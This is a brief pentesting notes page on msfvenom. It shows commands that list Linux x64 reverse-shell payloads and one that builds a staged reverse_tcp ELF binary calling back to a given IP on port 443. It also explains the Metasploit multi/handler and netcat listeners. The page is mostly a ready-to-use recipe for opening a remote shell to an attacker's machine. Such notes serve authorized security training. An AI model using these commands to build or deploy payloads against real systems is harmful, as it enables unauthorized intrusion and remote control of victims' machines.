---
title: msfvenom
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting, terminal, shells
---

# msfvenom

You can generate a webshell by using  msfvenom

```bash
# List payloads
msfvenom --list payloads | grep x64 | grep linux | grep reverse  
```
  
## Staged payload

```bash
msfvenom -p linux/x64/shell/reverse_tcp lhost=192.66.166.2 lport=443 -f elf -o newfile
```

After that

```bash
chmod +x newfile 
```

When creating a staged payload, you will need to use a metasploit handler (exploit/multi/handler) in order to receive the shell connection as only metasploit contains proper logic that will send the rest of the payload to the connector . In that case, the metasploit payload has to be the same one as the MSFVenom one.

## Stagedless payload

A stage less payload is a standalone program that does not need anything aditional (no metasploit connection), just the netcat listener on the computer.
